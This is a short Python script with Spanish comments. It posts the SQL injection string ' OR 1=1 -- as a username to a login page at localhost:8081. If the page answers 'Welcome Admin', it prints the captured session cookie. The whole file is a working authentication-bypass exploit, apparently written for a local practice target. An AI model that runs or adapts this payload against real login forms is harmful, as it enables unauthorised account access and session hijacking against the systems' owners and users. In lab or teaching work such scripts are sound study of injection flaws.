import requests

url = "http://localhost:8081/login"
# Payload para saltar la autenticación
# ' OR 1=1 -- 
payload = {"username": "' OR 1=1 --", "password": "any"}

r = requests.post(url, data=payload)

if "Welcome Admin" in r.text:
    print("[+] Autenticación bypass con éxito.")
    print("[+] Cookie de sesión obtenida: " + r.cookies.get_dict()['session'])
else:
    print("[-] Intento fallido. Revisa la sintaxis SQL.")
